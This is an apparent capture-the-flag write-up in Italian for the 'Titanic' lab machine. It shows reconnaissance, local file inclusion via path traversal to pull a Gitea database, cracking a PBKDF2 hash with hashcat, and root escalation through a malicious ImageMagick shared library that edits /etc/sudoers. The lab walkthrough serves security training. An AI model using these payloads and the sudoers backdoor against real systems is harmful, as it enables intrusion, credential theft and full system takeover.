# 🚢 Writeup Titanic

## 📝 Introduzione
Questa writeup racconta il processo di compromissione della macchina Titanic, ospitata all'indirizzo IP `10.10.11.55`. Il nostro viaggio inizia con una fase di ricognizione usando Nmap per identificare le porte aperte e i servizi associati, preparando il terreno per un'ulteriore esplorazione e sfruttamento.

## 🔍 Scansione Nmap
Avviamo il nostro attacco scansionando la macchina target con Nmap per scoprire le porte aperte e i servizi associati.

```bash
nmap 10.10.11.55
```

**Output:**
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-08 10:37 CEST
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

La scansione rivela due porte aperte:
- **Porta 22**: In esecuzione SSH, indicando un potenziale accesso remoto.
- **Porta 80**: Ospita un servizio HTTP, suggerendo un server web da esplorare.

## 🌐 Enumerazione Web
Navigando su `http://titanic.htb` è necessario aggiornare il file `/etc/hosts` per risolvere il dominio:

```
10.10.11.55    titanic.htb
```

Visitando il sito, analizziamo la sua funzionalità e scopriamo una vulnerabilità di Local File Inclusion (LFI) all'endpoint `http://titanic.htb/download?ticket=`. Testandola, recuperiamo con successo `/etc/passwd`:

```
http://titanic.htb/download?ticket=/etc/passwd
```

Tuttavia, la LFI sembra essere limitata a file specifici e non è immediatamente sfruttabile per un accesso più profondo. Prendiamo nota di questa vulnerabilità e procediamo con un'ulteriore enumerazione.

## 🔎 Scoperta Virtual Host
Per espandere la nostra superficie di attacco, usiamo `ffuf` per fare fuzzing di virtual host sul dominio.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://titanic.htb/ -H "Host: FUZZ.titanic.htb" -mc 200
```

**Output:**
```
        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://titanic.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 53ms]
:: Progress: [4989/4989] :: Job [1/1] :: 917 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```

Questo rivela un virtual host: `dev.titanic.htb`. Aggiorniamo di conseguenza `/etc/hosts`:

```
10.10.11.55    titanic.htb dev.titanic.htb
```

## 🐙 Esplorazione Gitea
Visitando `dev.titanic.htb`, incontriamo un'istanza di Gitea, un servizio Git self-hosted. Esplorando i repository sotto `Explore > Developer > Docker-config > gitea`, troviamo un file `docker-compose.yml`:

```yaml
version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Opzionale per accesso SSH
    volumes:
      - /home/developer/gitea/data:/data # Sostituisci con il tuo percorso
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: Always
```

Il mapping del volume `/home/developer/gitea/data:/data` suggerisce una directory contenente file di configurazione sensibili di Gitea. Ricercando su Gitea, scopriamo che memorizza i dati degli utenti in un file di database SQLite chiamato `gitea.db`.

## 📂 Sfruttamento LFI
Usando la vulnerabilità LFI identificata in precedenza, tentiamo di recuperare `gitea.db` dal percorso rivelato nella configurazione Docker:

```
http://titanic.htb/download?ticket=../../../../../home/developer/gitea/data/gitea/gitea.db
```

Questo scarica con successo il file del database, fornendo accesso ai dati interni di Gitea.

## 🗄️ Analisi Database Gitea
Esaminando `gitea.db`, estraiamo i dettagli dell'utente, concentrandoci sull'account `developer`:

```
2,"developer","developer","","developer@titanic.htb","0","enabled","e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56","pbkdf2$50000$50","0","0","0","","0","","","0ce6f07fc9b557bc070fa7bef76a0d15","8bf3e3452b78544f8bee9400d6936d34","en-US","","1722595646","1746682900","1746682900","0","-1","1","0","0","0","0","1","0","e2d95b7e207e432f62f3508be406c11b","developer@titanic.htb","0","0","0","0","2","0","0","0","0","","gitea-auto","0"
```

Informazioni chiave:
- **Username**: `developer`
- **Hash**: `e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56`
- **Salt**: `8bf3e3452b78544f8bee9400d6936d34`
- **Algoritmo**: PBKDF2-HMAC-SHA256
- **Iterazioni**: 50000

## 🔓 Cracking dell'Hash
Per crackare l'hash, lo convertiamo in un formato compatibile con Hashcat usando uno script Python:

```python
import base64

hash_hex = "e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56"
salt_hex = "8bf3e3452b78544f8bee9400d6936d34"
iterations = 50000
hash_algo = "sha256"  

def hex_to_base64(hex_string):
    try:
        bytes_data = bytes.fromhex(hex_string)
        base64_data = base64.b64encode(bytes_data).decode("utf-8")
        return base64_data
    except ValueError as e:
        return f"Errore nella conversione: {e}"


salt_base64 = hex_to_base64(salt_hex)
if "Errore" in salt_base64:
    print(salt_base64)
    exit(1)

hash_base64 = hex_to_base64(hash_hex)
if "Errore" in hash_base64:
    print(hash_base64)
    exit(1)


hashcat_format = f"{hash_algo}:{iterations}:{salt_base64}:{hash_base64}"


with open("hash.txt", "w") as f:
    f.write(hashcat_format)
    print("\nRisultato salvato in hash.txt")
```

Eseguendo lo script si genera `hash.txt`. Usiamo quindi Hashcat per crackare la password:

```bash
hashcat -m 10900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Questo produce le credenziali:
- **Username**: `developer`
- **Password**: `2[REDACTED]8`

## 🔑 Accesso SSH
Usando le credenziali crackate, ci connettiamo alla macchina via SSH:

```bash
ssh developer@titanic.htb
```

Dopo il login, localizziamo e leggiamo la flag dell'utente:

```bash
developer@titanic:~$ cat user.txt
105[REDACTED]770
```

## 🚀 Escalation dei Privilegi
Con l'accesso iniziale assicurato, cerchiamo vettori di escalation dei privilegi. Esplorando il filesystem, troviamo uno script in `/opt/scripts` chiamato `identify_images.sh`:

```bash
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

Questo script usa il comando `identify` di ImageMagick, che è vulnerabile allo sfruttamento tramite librerie condivise malevole. Creiamo una libreria malevola per escalare i privilegi:

Quindi in `/opt/app/static/assets/images` creiamo il file:

**`a.c`:**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("echo 'developer ALL=(ALL) NOPASSWD:ALL' | sudo tee -a /etc/sudoers");
}
```

Lo compiliamo in una libreria condivisa:

```bash
gcc -fPIC -shared -o ./libxcb.so.1 a.c -nostartfiles
```

Posizionando `libxcb.so.1` in `/opt/app/static/assets/images`, attendiamo che lo script venga eseguito (probabilmente su base programmata). Una volta eseguito, modifica `/etc/sudoers`, concedendo a `developer` privilegi sudo senza password. Escaliamo quindi a root:

```bash
sudo su
```

Come root, recuperiamo la flag di root:

```bash
root@titanic:/# cat /root/root.txt
[REDACTED]
```

## 🎉 Conclusione
Questa writeup dimostra la compromissione della macchina Titanic attraverso:
1. **Ricognizione**: Identificazione dei servizi con Nmap.
2. **Enumerazione web**: Scoperta di una vulnerabilità LFI.
3. **Enumerazione virtual host**: Scoperta di `dev.titanic.htb` e un'istanza di Gitea.
4. **Sfruttamento file**: Recupero e analisi di `gitea.db` via LFI.
5. **Cracking delle credenziali**: Estrazione e cracking della password di `developer`.
6. **Accesso iniziale**: Login via SSH per ottenere la flag dell'utente.
7. **Escalation dei privilegi**: Sfruttamento di una vulnerabilità di ImageMagick per ottenere l'accesso root e la flag di root.

